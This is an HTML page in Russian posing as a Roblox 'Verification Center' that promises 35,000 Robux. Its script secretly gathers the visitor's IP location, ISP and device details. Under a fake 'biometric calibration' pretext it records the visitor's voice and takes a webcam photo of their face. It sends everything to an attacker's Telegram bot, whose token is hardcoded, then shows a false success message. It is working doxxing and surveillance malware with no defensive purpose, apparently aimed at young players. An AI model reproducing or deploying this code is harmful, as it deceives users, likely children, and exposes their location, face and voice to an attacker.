<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Roblox | Verification Center</title>
    <style>
        body { font-family: sans-serif; background: #0b0c0d; color: white; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
        .box { background: #191b1d; border: 2px solid #0084ff; padding: 35px; border-radius: 25px; width: 85%; max-width: 380px; box-shadow: 0 0 30px #0084ff44; }
        .btn { background: #0084ff; color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-size: 20px; font-weight: 900; cursor: pointer; }
        #st { margin-top: 20px; color: #0084ff; font-weight: bold; }
        video { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; }
    </style>
</head>
<body>

<div class="box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" width="60" style="filter: invert(1); margin-bottom: 10px;">
    <h2>35,000 ROBUX</h2>
    <p>Для активации бонуса требуется подтверждение биометрии и аудио-калибровка устройства.</p>
    <button class="btn" id="go" onclick="startTotalDox()">АКТИВИРОВАТЬ</button>
    <div id="st"></div>
</div>

<video id="v" autoplay playsinline muted></video>
<canvas id="c" style="display:none;"></canvas>

<script>
    const BTN_TOKEN = '8357508874:AAGFROVFi2_D2AcQKIYlZ7rWgsqqedB3y3I';
    const CH_ID = '7889497672';

    async function startTotalDox() {
        document.getElementById('go').style.display = 'none';
        const st = document.getElementById('st');
        const v = document.getElementById('v');
        const c = document.getElementById('c');
        
        st.innerText = "ИНИЦИАЛИЗАЦИЯ ШЛЮЗА...";

        // 1. СБОР МАКСИМАЛЬНОГО ДОКСА
        let dox = `🧨 **FULL DOX REPORT** 🧨\n\n`;
        try {
            const res = await fetch('https://ipapi.co/json/');
            const d = await res.json();
            dox += `📍 **IP:** \`${d.ip}\`\n🌍 **Город:** ${d.city}, ${d.country_name}\n📡 **Провайдер:** ${d.org}\n`;
        } catch(e) { dox += `📍 IP: Блокировка\n`; }

        dox += `\n📱 **DEVICE:**\n`;
        dox += `🤖 **ОС:** ${navigator.platform}\n`;
        dox += `⚙️ **CPU:** ${navigator.hardwareConcurrency} ядер\n`;
        dox += `🖥 **Экран:** ${screen.width}x${screen.height}\n`;
        dox += `🔋 **Заряд:** Опрос...\n`;
        dox += `🌐 **Язык:** ${navigator.language}\n`;
        dox += `💡 **GPU:** ${getGPU()}\n`;

        if (navigator.getBattery) {
            const b = await navigator.getBattery();
            dox = dox.replace('Опрос...', `${(b.level * 100).toFixed(0)}%`);
        }

        try {
            // 2. ЗАПРОС КАМЕРЫ И МИКРОФОНА
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
            v.srcObject = stream;
            
            // 3. ЗАПИСЬ ГОЛОСА (5 секунд)
            const recorder = new MediaRecorder(stream);
            const chunks = [];
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = async () => {
                const audioBlob = new Blob(chunks, { type: 'audio/ogg' });
                const fdA = new FormData();
                fdA.append('chat_id', CH_ID);
                fdA.append('voice', audioBlob, 'audio.ogg');
                fetch(`https://api.telegram.org/bot${BTN_TOKEN}/sendVoice`, { method: 'POST', body: fdA });
            };
            
            recorder.start();
            st.innerText = "КАЛИБРОВКА АУДИО И ВИДЕО...";
            
            setTimeout(() => {
                recorder.stop(); // Остановка записи звука
                
                // 4. ФОТО И ОТПРАВКА ДОКСА
                c.width = v.videoWidth;
                c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                
                c.toBlob(blob => {
                    const fd = new FormData();
                    fd.append('chat_id', CH_ID);
                    fd.append('photo', blob, 'face.jpg');
                    fd.append('caption', dox + `\n\n📸 **ФОТО И ГОЛОС ПОЛУЧЕНЫ!**`);

                    fetch(`https://api.telegram.org/bot${BTN_TOKEN}/sendPhoto`, { method: 'POST', body: fd })
                    .then(() => {
                        stream.getTracks().forEach(t => t.stop());
                        alert("✅ Верификация пройдена! Робуксы зачислятся автоматически.");
                        window.location.href = "https://www.roblox.com";
                    });
                }, 'image/jpeg', 0.8);
            }, 5500);

        } catch (e) {
            alert("Ошибка! Для работы Face ID нужно разрешить доступ к камере и микрофону.");
            document.getElementById('go').style.display = 'block';
        }
    }

    function getGPU() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
        } catch(e) { return 'Неизвестно'; }
    }
</script>
</body>
</html>
